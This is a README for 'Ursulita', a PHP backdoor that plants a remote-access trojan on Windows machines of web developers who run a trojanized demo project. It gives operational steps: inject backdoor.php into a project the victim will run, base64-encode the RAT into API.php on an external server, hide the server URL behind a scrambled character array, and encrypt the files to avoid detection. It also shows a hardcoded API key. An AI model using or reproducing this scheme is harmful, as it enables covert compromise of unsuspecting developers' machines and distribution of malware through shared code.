# Ursulita Project
**Tested on**: PHP  7.0.27
**Tags**:PHP, backdoor, RAT, API

Thanks to [@Yulefier](https://github.com/Yulefier "@Yulefier") for helping.
# Description
Ursulita project is a web injectable backdoor for windows.

# Getting started

First the project is just an idea about hunting a web developers using a simple trap, You have **backdoor.php** file, you should inject this file inside a demo project or any project that you might know your victim is interested in, 

    $filename = "ursulita.exe"; 

so this will be the file name in the windows temp folder, you can rename it as you want, 

Inside the API.php file there's two important things first is the API jey

    case"ursulita".sha1("3433"): //The API key validation

so that's mean the API key will be **ursulita+3433(hashed into sha1)**

so the full API key will be..

    ursulitaF3C9B754086C5C5C8C23F084E2A523DE8FD9C769
if you wanted to change the API key , you must change it in backdoor.php file too.

The second thing and the most important is the RAT details or whatever you wanna inject in the victim PC, it will be encoded inside **API.php** file,
You can encode it using **encoder.php** tool that included with the project,

just by changing this two:

    $file = "ursulita.exe"; //The input file name
    $outfile = "EncodedUrsulita.txt"; //Output file name
Then from **EncodedUrsulita.txt** you take the **base64** encoded data and put it inside **API.php**.

So you will include the classes folder and the backdoor details in the victim project , but the **API.php** file should be on external public server because the victim PC will try to connect into the **API.php**.

Also , you should put the **API.php** link inside **/classes/SETTING.php** file:

    $index = array(0, 2, 3, 1, 5, 6, 4, 8, 9, 7, 11,10);
    //  The below array is http://127.0.0.1/api.php , you need to change it to your API.php file link
    $code = array("h", "p", "t", "t", "127.", ":", "//", "1", "0.", "0.", "api.php","/" );

This function is reading the **$code** array elements then it print them as your custom order in **$index** array .

The encoder.php tool this stays for you only.
some other ideas might be usefull for you:

 - it's prefered to encrypt the **backdoor.php** and **SETTING.php**   
   contains before injecting them in the victim project.
 - Encrypt them    with a private key and hide the key in the victem
   project too , if    you want to know more about the **AES**
   encrypting [Click    Here](https://aesencryption.net/) .

# The project diagram

This is simple diagram to make it more clear.

![enter image description here](https://github.com/Alaa-abdulridha/Ursulita-Web-developers-trap/blob/master/Plan.png?raw=true)
